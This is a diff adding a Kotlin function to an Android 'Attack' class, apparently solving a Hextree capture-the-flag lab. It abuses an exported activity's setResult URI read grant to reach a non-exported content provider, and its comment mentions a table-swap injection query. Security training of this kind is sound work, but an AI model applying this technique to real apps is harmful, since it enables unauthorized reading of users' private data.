@@ -394,4 +394,30 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		)
 	}
 
+	/**
+	 * FLAG 33.1 - Return Provider Access
+	 * Technique: startActivityForResult + URI grant via setResult()
+	 *
+	 * Flow:
+	 * 1. Start Flag33Activity1 (exported=true) with action="io.hextree.FLAG33"
+	 * 2. Activity1 builds a result intent: data=content://io.hextree.flag33_1/flags,
+	 *    flags=1 (FLAG_GRANT_READ_URI_PERMISSION)
+	 * 3. setResult(RESULT_OK, that intent) -> finish() -> delivered to onActivityResult()
+	 * 4. We receive a temporary read grant on that exact URI
+	 * 5. Query it with table-swap injection to read from Note table instead of Flag table
+	 *
+	 * Key insight: exported=false on the provider doesn't matter here - the grant from
+	 * setResult() bypasses it entirely, same mechanism as Flag6's FLAG_GRANT_READ_URI_PERMISSION
+	 * but delivered via a result intent instead of an intent redirect.
+	 */
+	fun flag33A1() {
+		val activityPath = "$packageName.activities.Flag33Activity1"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			action = "io.hextree.FLAG33"
+		}
+		activity.startActivityForResult(intent, 331)
+	}
+
 }
